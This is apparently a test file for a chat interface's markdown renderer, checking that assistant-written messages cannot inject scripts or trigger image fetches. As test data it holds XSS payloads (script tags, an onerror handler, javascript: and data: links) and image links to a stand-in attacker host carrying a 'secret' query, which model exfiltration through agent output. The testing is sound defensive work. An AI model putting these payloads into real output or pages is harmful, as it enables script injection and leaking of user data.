// @vitest-environment jsdom
import {
  AssistantRuntimeProvider,
  type ThreadMessageLike,
  ThreadPrimitive,
  useExternalStoreRuntime,
} from "@assistant-ui/react";
import { cleanup, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { TooltipProvider } from "@/components/ui/tooltip";
import { AssistantMessage } from "./thread.aui";

afterEach(cleanup);

/** Renders `text` as an agent message through the real message component (no viewport). */
function Harness({ text }: { text: string }) {
  const message: ThreadMessageLike = {
    id: "msg-1",
    role: "assistant",
    content: [{ type: "text", text }],
    status: { type: "complete", reason: "stop" },
  };
  const runtime = useExternalStoreRuntime<ThreadMessageLike>({
    messages: [message],
    convertMessage: (m) => m,
    isRunning: false,
    onNew: async () => {},
  });
  return (
    <AssistantRuntimeProvider runtime={runtime}>
      <TooltipProvider>
        <ThreadPrimitive.Root>
          <div role="log" aria-label="Conversation">
            <ThreadPrimitive.Messages>{() => <AssistantMessage />}</ThreadPrimitive.Messages>
          </div>
        </ThreadPrimitive.Root>
      </TooltipProvider>
    </AssistantRuntimeProvider>
  );
}

async function renderAgentText(text: string): Promise<HTMLElement> {
  render(<Harness text={text} />);
  const log = await screen.findByRole("log", { name: "Conversation" });
  await waitFor(() => expect(log.querySelector(".aui-md")).not.toBeNull());
  return log;
}

describe("MarkdownText", () => {
  it("renders markdown (sanity check for the tests below)", async () => {
    const log = await renderAgentText("**bold** and a [link](https://example.com/x)");
    expect(log.querySelector("strong")?.textContent).toBe("bold");
    const link = log.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/x");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("agent markdown cannot inject script or javascript: links", async () => {
    const log = await renderAgentText(
      [
        "<script>window.__pwned = 1</script>",
        '<img src=x onerror="window.__pwned = 2">',
        '<a href="javascript:window.__pwned=3">raw html link</a>',
        "[markdown link](javascript:window.__pwned=4)",
        "[data link](data:text/html;base64,PHNjcmlwdD48L3NjcmlwdD4=)",
      ].join("\n\n"),
    );
    expect(log.querySelector("script")).toBeNull();
    expect(log.querySelector("img")).toBeNull();
    // raw HTML is shown as text, never parsed: no element carries an event-handler attribute
    for (const el of log.querySelectorAll("*")) {
      const handlers = el.getAttributeNames().filter((n) => n.startsWith("on"));
      expect(handlers, `<${el.localName}> attributes`).toEqual([]);
    }
    expect(log.textContent).toContain("<script>window.__pwned = 1</script>");
    for (const a of log.querySelectorAll("a")) {
      const href = a.getAttribute("href") ?? "";
      expect(href, `href of "${a.textContent}"`).not.toMatch(/^\s*(javascript|data|vbscript):/i);
    }
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });

  it("an image is never fetched: its alt text, and a link only for an http(s) URL", async () => {
    const log = await renderAgentText(
      [
        "![the diagram](https://evil.example/p.png?d=secret)",
        "![](https://evil.example/q.png)",
        "![bad](javascript:window.__pwned=5)",
        "[![nested](https://evil.example/r.png)](https://example.com/page)",
      ].join("\n\n"),
    );
    expect(log.querySelector("img, picture, source, image")).toBeNull();
    expect(document.querySelector('link[rel="preload"], link[rel="prefetch"]')).toBeNull();
    const link = [...log.querySelectorAll("a")].find((a) => a.textContent?.includes("the diagram"));
    expect(link?.getAttribute("href")).toBe("https://evil.example/p.png?d=secret");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    // no alt text: it is still said to be an image
    expect(log.textContent).toContain("image");
    // a script URL is no link
    for (const a of log.querySelectorAll("a")) {
      expect(a.getAttribute("href") ?? "").not.toMatch(/^\s*javascript:/i);
    }
    expect(log.textContent).toContain("bad");
    // an image inside a link is its text, inside the one link
    const page = [...log.querySelectorAll("a")].find(
      (a) => a.getAttribute("href") === "https://example.com/page",
    );
    expect(page?.textContent).toContain("nested");
    expect(page?.querySelector("a")).toBeNull();
    expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
  });
});
